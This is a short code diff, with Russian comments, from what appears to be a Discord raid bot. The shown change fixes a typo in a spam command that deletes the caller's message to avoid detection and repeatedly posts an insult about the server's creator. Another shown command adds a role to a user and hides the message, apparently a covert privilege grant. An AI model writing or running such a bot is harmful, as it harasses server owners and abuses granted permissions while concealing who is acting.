@@ -14,7 +14,7 @@ async def spam(ctx, m):
     await ctx.message.delete() #удаляем сообщение пользователя, чтобы не спалился
     count = 0
     while count < int(m):
-        await ctx.send("Создатель данного сервера тупое мудло\nЗаказчик бота: Мистер_Шотакон \nСоздтель бота: Wahha") #отправка текста
+        await ctx.send("Создатель данного сервера тупое мудло\nЗаказчик бота: Мистер_Шотакон \nСоздатель бота: Wahha") #отправка текста
         count += 1
 
 @client.command(pass_context=True)
@@ -86,4 +86,5 @@ async def admin(ctx):  # создаем асинхронную фунцию бо
     await user.add_roles(role) #добовляем роль
     
     await ctx.message.delete()
+
 client.run(con.BOT_TOKEN)
